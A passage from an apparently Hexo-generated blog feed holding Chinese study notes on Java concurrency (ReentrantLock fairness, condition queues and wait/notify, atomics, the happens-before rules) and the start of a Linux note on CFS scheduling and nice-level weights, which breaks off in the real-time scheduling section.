class="title">nonfairTryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">    <span class="keyword">int</span> c = getState();</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">        <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">        <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">        setState(nextc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>公平版本</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    acquire(<span class="number">1</span>); <span class="comment">// 其会调用tryAcquire</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">    <span class="keyword">int</span> c = getState();</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">            compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">        <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">        <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">        setState(nextc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>即使是公平版本的锁，tryLock也是不公平的</p><blockquote><p>Even when this lock has been set to use a fair ordering policy, a call to tryLock() will immediately acquire the lock if it is available, whether or not other threads are currently waiting for the lock. This “barging” behavior can be useful in certain circumstances, even though it breaks fairness. If you want to honor the fairness setting for this lock, then use tryLock(0, TimeUnit.SECONDS) which is almost equivalent (it also detects interruption).</p></blockquote></li><li>公平的版本，在JCIP的性能测试中性能比非公平的低两个数量级</li><li>如果请求锁的时间时间间隔比较长，或者持有锁的时间间隔比较长，那么使用公锁是ok的</li><li>内置锁是非公平的<h4 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h4></li></ul></li><li><p>如果读并不是非常多，那么其实会降低性能，因为该锁算法复杂。所以使用前要对程序的瓶颈有明确的分析、测试</p></li></ul><h3 id="Fork-Join"><a href="#Fork-Join" class="headerlink" title="Fork-Join"></a>Fork-Join</h3><ul><li>fork-join 框架使用了一种有效的智能方法来平衡可用线程的工作负载，这种方法称为工作密取（work stealing)。每个工作线程都有一个双端队列 ( deque ) 来完成任务。一个工作线程将子任务压人其双端队列的队头。（只有一个线程可以访问队头，所以不需要加锁。）一个工作线程空闲时，它会从另一个双端队列的队尾“ 密取” 一个任务</li></ul><h3 id="构建自定义的同步工具"><a href="#构建自定义的同步工具" class="headerlink" title="构建自定义的同步工具"></a>构建自定义的同步工具</h3><h4 id="前置条件不满足的处理方案"><a href="#前置条件不满足的处理方案" class="headerlink" title="前置条件不满足的处理方案"></a>前置条件不满足的处理方案</h4><ul><li>可以<code>Thread.sleep()</code></li><li>可以<code>park</code></li><li>可以自旋</li><li>可以<code>yield</code>，对于很快（但是使用自旋又太浪费的地方）就可以满足前置条件的情况，这一个比较好的选择（JCIP说比较<code>park</code>好（14.1.1最后），但是我觉得似乎不尽然，毕竟让出了时间片不就等于<code>park</code>）</li></ul><h4 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h4><ul><li>构成前提条件的变量必须由对象的锁来保护，从而使得它们在测试前提条件的同时保持不变。如果前提条件尚未满足，就必须释放锁</li><li>条件队列：每个对象都可以作为一个条件队列。其使得一组线程（等待线程集合）能够通过某种方式来等待特定的条件变为真</li><li>如果某个功能无法通过“轮询+休眠”实现，那么其也无法通过条件队列实现（公平的条件队列除外，条件队列可以实现公平，但是“轮询+休眠”没法实现，除非搞个队列，但是这样子不就成了条件队列）</li><li>条件谓词：使得某个操作成为状态依赖操作的前提条件（比如阻塞队列的take操作的条件谓词就是“队列不为空”），其是类中各个状态变量构成的表达式</li><li><p>应该将条件队列相关联的条件谓词以及在这些谓词上等待的操作都写入文档</p></li><li><p>Monitor Condition</p><ul><li>如果调用同步方法的线程必须被阻塞或是其他原因不能立刻进行，它能够在一个监视条件上等待，这将导致该客户线程暂时<strong>释放监视锁</strong>，并<strong>挂起（WAITING / TIMED_WAITING）</strong>在监视条件上</li><li>同步方法线程恢复。一旦早先挂起在某监视条件上的同步方法线程获取通知，它将继续在最初的等待监视条件的点上执行，执行的条件是唤醒后抢占到监视锁。当线程从wait方法中被唤醒时，他在重新请求锁时不具有任何特殊的优先级，而要与任何其他尝试进入同步代码块的线程一起正常的在锁上竞争</li><li>当调用wait时，需要持有锁，否则会抛出<code>IllegalMonitorStateException</code></li><li>不提供公平的队列</li><li>只有一个条件变量</li></ul></li><li><p>调用wait之前要测试条件谓词，并且从wait中返回时再次进行测试。要在循环中调用wait</p><ul><li>信号丢失：如果线程A通知了一个条件队列，但是线程B随后调用wait，那么wait并不会立刻醒来，而是要等待另一个通知来唤醒它。所以在wait之前要检查条件谓词</li><li>Spurious wakeup：（来自<a href="https://en.wikipedia.org/wiki/Spurious_wakeup" target="_blank" rel="noopener">wiki</a>。内容可能有争议）。比如，当只有一个资源变得可用时，本来我们调用notify，那么可以相信醒来的那个一定可以拿到资源。但是，并不是如此，实际操作系统中，有时会出现即使是上面那种情况，醒来后还是发现资源不可用</li><li>有个问题：wait唤醒后需要抢占锁，那么，是否有可能某线程虽然被notify唤醒，也就是只有一个等待该条件的线程醒来获得资源，但是同时外界来了一个线程，并且竞争锁先成功，那么这个被唤醒的不就没资源了吗，从而类似假醒</li></ul></li><li><p>确保使用与条件队列相关联的锁来保护条件谓词的各个状态变量</p></li><li><p>调用wait、notify、notifyAll时，要持有与条件队列相关的锁，否则有lost-wake-up问题，比如说代码如下</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cnt+=<span class="number">1</span>;</span><br><span class="line">notify();</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(cnt&lt;=<span class="number">0</span>) &#123;</span><br><span class="line">    wait();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 然后，在检查了<code>cnt&lt;=0</code>这个条件后、调用<code>wait</code>之前，有个线程完成了<code>cnt++;notify()</code>的操作，那么消费者就丢失了wake-up，陷入了无限等待（如果其在等待时没有被唤醒的话）</p></li><li><p>检查条件谓词之后以及开始执行相关操作之前，不要释放锁</p></li><li><p>调用notify时，JVM会从条件队列上等待的多个线程中选择一个来唤醒，而调用notifyAll时则会唤醒所有在这个条件队列上等待的线程。调用notify或notifyAll时必须持有条件队列对象的锁，而如果这些等待的线程此时不能重新获得锁，那么无法从wait返回，因此发出通知的线程要尽快释放锁</p></li><li><p>在一个条件队列上等待同一个条件谓词</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseBoundedBuffer</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> V[] buf;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">BaseBoundedBuffer</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = (V[]) <span class="keyword">new</span> Object[capacity];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">doPut</span><span class="params">(V v)</span> </span>&#123;</span><br><span class="line">        buf[tail] = v;</span><br><span class="line">        <span class="keyword">if</span> (++tail == buf.length)</span><br><span class="line">            tail = <span class="number">0</span>;</span><br><span class="line">        ++count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> V <span class="title">doTake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        V v = buf[head];</span><br><span class="line">        buf[head] = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (++head == buf.length)</span><br><span class="line">            head = <span class="number">0</span>;</span><br><span class="line">        --count;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count == buf.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundedBuffer</span>&lt;<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">BaseBoundedBuffer</span>&lt;<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// CONDITION PREDICATE: not-full (!isFull())</span></span><br><span class="line">    <span class="comment">// CONDITION PREDICATE: not-empty (!isEmpty())</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BoundedBuffer</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BLOCKS-UNTIL: not-full</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(V v)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (isFull())</span><br><span class="line">            wait();</span><br><span class="line">        doPut(v);</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BLOCKS-UNTIL: not-empty</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (isEmpty())</span><br><span class="line">            wait();</span><br><span class="line">        V v = doTake();</span><br><span class="line">        notifyAll();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下有个问题：调用notify后，take被叫醒，然而还是empty——此时isFull不满足，所以本应该put方法被得到通知被执行，所以这个信号就好像丢失了</p></li><li><p>只有在同时满足以下两个条件时，才能用单一的notify而不是notifyAll</p><ul><li>所有等待的线程类型相同。只有一个条件谓词与条件队列相关，并且每个线程从wait返回后将执行相同的操作</li><li>在条件变量上每次通知最多只能唤醒一个线程来执行</li></ul></li><li><p>使用notifyAll比notify更容易正确，所以除非notifyAll对性能影响过大，否则应该优先使用notifyAll</p></li></ul><h3 id="原子变量与非阻塞同步机制"><a href="#原子变量与非阻塞同步机制" class="headerlink" title="原子变量与非阻塞同步机制"></a>原子变量与非阻塞同步机制</h3><h4 id="非阻塞算法"><a href="#非阻塞算法" class="headerlink" title="非阻塞算法"></a>非阻塞算法</h4><ul><li>基于底层原子机器指令来代替锁</li><li>多个线程竞争时不会发生阻塞</li><li>极大地减少调度开销（因为使用自旋而不是挂起？）</li><li>不存在死锁和其他活跃性问题（饥饿呢？活锁呢？）<ul><li>“在不常见的情况下，存在活锁风险”</li><li>如果其他线程每次在CAS竞争中都成功，那么本线程就会饥饿，但是实际中很少发生</li></ul></li><li>不会受到单个线程失败的影响</li></ul><h4 id="锁的劣势"><a href="#锁的劣势" class="headerlink" title="锁的劣势"></a>锁的劣势</h4><ul><li>调度开销</li><li>线程恢复执行时，需要等待其他线程执行完他们的时间片，才能被调度执行</li><li>如果一个线程在持有锁时发生了page fault、调度延迟之类的情况，那么其他线程都会被延迟</li><li>优先级反转：被阻塞的高优先级线程因为需要等待低优先级线程持有的锁，所以导致它的优先级降低到低优先级线程的那个级别（不知道是OS真的降低了优先级还是说虽然有高优先级但是表现上跟低优先级差不多）</li></ul><h4 id="原子变量"><a href="#原子变量" class="headerlink" title="原子变量"></a>原子变量</h4><ul><li>内存可见性(Ref from atomic javadoc)<blockquote><ul><li><strong>The memory effects for accesses and updates of atomics generally follow the rules for volatiles</strong>, as stated in The Java Language Specification (17.4 Memory Model) :</li><li><strong>get has the memory effects of reading a volatile variable</strong>.</li><li><strong>set has the memory effects of writing (assigning) a volatile variable</strong>.</li><li>lazySet has the memory effects of writing (assigning) a volatile variable except that it permits reorderings with subsequent (but not previous) memory actions that do not themselves impose reordering constraints with ordinary non-volatile writes. Among other usage contexts, lazySet may apply when nulling out, for the sake of garbage collection, a reference that is never accessed again.</li><li>weakCompareAndSet atomically reads and conditionally writes a variable but does not create any happens-before orderings, so provides no guarantees with respect to previous or subsequent reads and writes of any variables other than the target of the weakCompareAndSet.</li><li>compareAndSet and all other read-and-update operations such as getAndIncrement have the memory effects of both reading and writing volatile variables.</li></ul></blockquote></li></ul><h3 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h3><ul><li>JMM为程序中所有的操作（包括变量读写、monitor的加锁/释放、线程的启动和join）定义了一个偏序关系，称之为Happen-before，如果要保证<strong>执行操作B的线程</strong>看到<strong>操作A的结果</strong>，那么A和B之间就必须满足Happen-Before的关系。如果两个操作之间没有Happen-Before的关系，那么JVM就可以对它们任意地重排序</li><li>以下引用自<em>Java Concurrency in Practice</em><blockquote><ul><li><strong>A data race occurs when a variable is read by more than one thread, and written by at least one thread, but the reads and writes are not ordered by happens-before</strong>. A correctly synchronized program is one with no data races; correctly synchronized programs exhibit sequential consistency, meaning that all actions within the program appear to happen in a fixed, global order.</li><li>The rules for happens-before are:<ul><li>Program order rule. Each action in a thread happens-before every action in that thread that comes later in the program order.</li><li>Monitor lock rule. An unlock on a monitor lock happens-before every subsequent lock on that same monitor lock. [3]</li><li>Volatile variable rule.A write to a volatile field happens-before every subsequent read of that same field. [4]</li><li>Thread start rule. A call to Thread start on a thread happens-before every action in the started thread.</li><li>Thread termination rule. Any action in a thread happens-before any other thread detects that thread has terminated, either by successfully return from Thread.join or by Thread.isAlive returning false.</li><li>Interruption rule. A thread calling interrupt on another thread happens-before the interrupted thread detects the interrupt (either by having InterruptedException thrown, or invoking isInterrupted or interrupted).</li><li>Finalizer rule. The end of a constructor for an object happens-before the start of the finalizer for that object.</li><li>Transitivity. If A happens-before B, and B happens-before C, then A happens-before C.</li></ul></li></ul></blockquote></li></ul><h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><ul><li>哲学家进餐（5人）<ul><li>原子的获取两个（<code>Semaphore.tryAcquire(2)</code>），获取失败则回避随机长度的时间，避免活锁</li><li>获取一个后，获取第二个失败，则释放第一个，随机退避，避免活锁</li><li>奇数编号的哲学家先拿起左边的筷子，接着拿起右边的，偶数编号的颠倒过来</li><li>只允许四个人同时就餐</li></ul></li></ul><h3 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h3><ul><li>伪共享（false sharing）（<a href="https://www.cnblogs.com/cyfonly/p/5800758.html" target="_blank" rel="noopener">Ref</a>）<ul><li>RFO：Request for owner，如果某cache line是shared的状态，然后需要写该cache line，那么就会导致发送RFO，使得其他的该cache line的副本失效</li><li>如果两个无关的变量在同一cache line，那么就会导致写其中一个变量，另一个变量的本地缓存也失效了，从而要读取时得去L3、内存取新数据</li></ul></li><li>如果保证资源只有一个线程去访问？通过限制只有一个线程（比如单线程的日志服务，然后所有日志工作都交给该服务）、使用锁（粒度可以是<code>call</code>或是<code>thread</code>，后者可重入，前者不可以）</li><li>UncaughtExceptionHandler：可以用 <code>setUncaughtExceptionHandler</code> 方法为任何线程安装一个处理器。也可以用 Thread类的静态方法 <code>setDefaultUncaughtExceptionHandler</code> 为所有线程安装一个默认的处理器</li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>对象的正确发布的责任是否是在使用者而不是在线程安全类，即线程安全类也要求被正确发布</p></li><li><p>代码3-13那里，有个<code>cache.getFactors(i)</code>，这个操作应该不是原子的吧，那么如果<code>.</code>操作符完成之前，<code>cache</code>值被更新（即引用被更新），含义是什么</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;串行线程的封闭&quot;&gt;&lt;a href=&quot;#串行线程的封闭&quot; class=&quot;headerlink&quot; title=&quot;串行线程的封闭&quot;&gt;&lt;/a&gt;串行线程的封闭&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;线程封闭对象的要求：&lt;ul&gt;
&lt;li&gt;只能由单个线程拥有&lt;/li&gt;
&lt;li&gt;通过安全的发
      
    
    </summary>
    
      <category term="JAVA" scheme="https://h-zex.github.io/categories/JAVA/"/>
    
      <category term="Concurrency" scheme="https://h-zex.github.io/categories/JAVA/Concurrency/"/>
    
    
  </entry>
  
  <entry>
    <title>My Linux Note</title>
    <link href="https://h-zex.github.io/2019/05/01/My-Linux-Note/"/>
    <id>https://h-zex.github.io/2019/05/01/My-Linux-Note/</id>
    <published>2019-05-01T02:22:59.000Z</published>
    <updated>2019-09-01T11:12:35.245Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux调度"><a href="#Linux调度" class="headerlink" title="Linux调度"></a>Linux调度</h3><ul><li>linux内核设计与实现第4章</li><li>不同进程有不同的调度算法（这种模块化结构称为调度器类）。每个调度器都有一个优先级，不同调度器之间如何协调？拥有一个可执行进程的最高优先级的调度器会胜出，去选择接下来要执行那个进程（The highest priority scheduler class that has a runnable process wins, selecting who runs next.）</li></ul><h4 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h4><ul><li>从Linux2.6.23开始引入</li><li>针对普通进程的调度器类（Linux中称为<code>SCHED_NORMAL</code>，POSIX称为<code>SCHED_OTHER</code>）</li><li>基于一个简单的理念：每个进程都能获得<code>1/n</code>的处理器时间（n是可运行的进程数量），任何可测量的周期内都是<code>1/n</code>（一个先运行5ms，另一个运行5ms是不满足这个理念的，要做到好像他们在10ms内同时运行，各自使用了一半的处理器能力）<blockquote><ul><li>Ref: <a href="https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf" target="_blank" rel="noopener">https://www.cs.columbia.edu/~junfeng/13fa-w4118/lectures/l13-adv-sched.pdf</a></li><li>Approximate fair scheduling. Run each process once per schedule latency period(就是sched_latency_ns，用<code>sysctl -a</code>可以看到). Time slice for process Pi: <code>T * Wi/(Sum of all Wi)</code></li><li>Too many processes? Lower bound on smallest time slice. Schedule latency = lower bound * number of procs</li><li>Pick proc with weighted minimum runtime so far  <code>Virtual runtime: task-&gt;vruntime += executed time / Wi</code></li><li>Red-black tree, Balanced binary search tree, Ordered by vruntime as key, O(lgN) insertion, deletion, update, O(1): find min(<code>min_vruntime</code> caches smallest value)</li><li>Update <code>vruntime</code> and <code>min_vruntime</code>: When task is added or removed, On every timer tick, context switch</li><li>Converting nice level to weight(): <code>static const int prio_to_weight[40] (sched.h)</code>, Nice level changes by 1-&gt;10% weight.(Pre-computed to avoid Floating point operations, Runtime overhead)(<strong>In the current implementation, each unit of difference in the nice values of two processes results in a factor of 1.25 in the degree to which the scheduler favors the higher priority process.</strong>, 来自sched和nice的的manual)<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="comment">// from https://elixir.bootlin.com/linux/v3.4/source/kernel/sched/sched.h#L804</span></span><br><span class="line">&gt;   <span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;    * Nice levels are multiplicative, with a gentle 10% change for every</span></span><br><span class="line"><span class="comment">&gt;    * nice level changed. I.e. when a CPU-bound task goes from nice 0 to</span></span><br><span class="line"><span class="comment">&gt;    * nice 1, it will get ~10% less CPU time than another CPU-bound task</span></span><br><span class="line"><span class="comment">&gt;    * that remained on nice 0.</span></span><br><span class="line"><span class="comment">&gt;    *</span></span><br><span class="line"><span class="comment">&gt;    * The "10% effect" is relative and cumulative: from _any_ nice level,</span></span><br><span class="line"><span class="comment">&gt;    * if you go up 1 level, it's -10% CPU usage, if you go down 1 level</span></span><br><span class="line"><span class="comment">&gt;    * it's +10% CPU usage. (to achieve that we use a multiplier of 1.25.</span></span><br><span class="line"><span class="comment">&gt;    * If a task goes up by ~10% and another task goes down by ~10% then</span></span><br><span class="line"><span class="comment">&gt;    * the relative distance between them is ~25%.)</span></span><br><span class="line"><span class="comment">&gt;    */</span></span><br><span class="line">&gt;   <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> prio_to_weight[<span class="number">40</span>] = &#123;</span><br><span class="line">&gt;    <span class="comment">/* -20 */</span>     <span class="number">88761</span>,     <span class="number">71755</span>,     <span class="number">56483</span>,     <span class="number">46273</span>,     <span class="number">36291</span>,</span><br><span class="line">&gt;    <span class="comment">/* -15 */</span>     <span class="number">29154</span>,     <span class="number">23254</span>,     <span class="number">18705</span>,     <span class="number">14949</span>,     <span class="number">11916</span>,</span><br><span class="line">&gt;    <span class="comment">/* -10 */</span>      <span class="number">9548</span>,      <span class="number">7620</span>,      <span class="number">6100</span>,      <span class="number">4904</span>,      <span class="number">3906</span>,</span><br><span class="line">&gt;    <span class="comment">/*  -5 */</span>      <span class="number">3121</span>,      <span class="number">2501</span>,      <span class="number">1991</span>,      <span class="number">1586</span>,      <span class="number">1277</span>,</span><br><span class="line">&gt;    <span class="comment">/*   0 */</span>      <span class="number">1024</span>,       <span class="number">820</span>,       <span class="number">655</span>,       <span class="number">526</span>,       <span class="number">423</span>,</span><br><span class="line">&gt;    <span class="comment">/*   5 */</span>       <span class="number">335</span>,       <span class="number">272</span>,       <span class="number">215</span>,       <span class="number">172</span>,       <span class="number">137</span>,</span><br><span class="line">&gt;    <span class="comment">/*  10 */</span>       <span class="number">110</span>,        <span class="number">87</span>,        <span class="number">70</span>,        <span class="number">56</span>,        <span class="number">45</span>,</span><br><span class="line">&gt;    <span class="comment">/*  15 */</span>        <span class="number">36</span>,        <span class="number">29</span>,        <span class="number">23</span>,        <span class="number">18</span>,        <span class="number">15</span>,</span><br><span class="line">&gt;   &#125;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote></li></ul><blockquote><ul><li>Hierarchical, modular scheduler <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;    <span class="class"><span class="keyword">class</span> = <span class="title">sched_class_highest</span>;</span></span><br><span class="line">&gt;    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">&gt;        p = class-&gt;pick_next_task(rq);</span><br><span class="line">&gt;        <span class="keyword">if</span> (p)</span><br><span class="line">&gt;            <span class="keyword">return</span> p;</span><br><span class="line">&gt;       <span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;        * Will never be NULL as the idle class always</span></span><br><span class="line"><span class="comment">&gt;        * returns a non-NULL p:</span></span><br><span class="line"><span class="comment">&gt;        */</span></span><br><span class="line">&gt;        <span class="class"><span class="keyword">class</span> = <span class="title">class</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">&gt;    &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p>Ref: <a href="https://doc.opensuse.org/documentation/leap/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html" target="_blank" rel="noopener">SUSE-doc-Tuning the Task Scheduler</a></p><p>sched_latency_ns<br>Targeted preemption latency for CPU bound tasks. Increasing this variable increases a CPU bound task’s timeslice. A task’s timeslice is its weighted fair share of the scheduling period:</p><p>timeslice = scheduling period * (task’s weight/total weight of tasks in the run queue)</p><p>The task’s weight depends on the task’s nice level and the scheduling policy. Minimum task weight for a SCHED_OTHER task is 15, corresponding to nice 19. The maximum task weight is 88761, corresponding to nice -20.</p><p>Timeslices become smaller as the load increases. When the number of runnable tasks exceeds sched_latency_ns/sched_min_granularity_ns, the slice becomes number_of_running_tasks * sched_min_granularity_ns. Prior to that, the slice is equal to sched_latency_ns.</p><blockquote><p>sched_min_granularity_ns</p><p>Minimal preemption granularity for CPU bound tasks. See sched_latency_ns for details. The default value is 4000000 (ns).</p></blockquote><p>This value also specifies the maximum amount of time during which a sleeping task is considered to be running for entitlement calculations. Increasing this variable increases the amount of time a waking task may consume before being preempted, thus increasing scheduler latency for CPU bound tasks. The default value is 6000000 (ns).</p></blockquote><h4 id="Real-time-scheduling"><a href="#Real-time-scheduling" class="headerlink" title="Real-time scheduling"></a>Real-time scheduling</h4><blockquote><ul><li>Linux has soft real-time scheduling: No hard real-time guarantees</li><li>All real-time processes are higher priority than any conventional processes</li><li>Processes with priorities [0, 99] are real-time</li><li>Process can be converted to 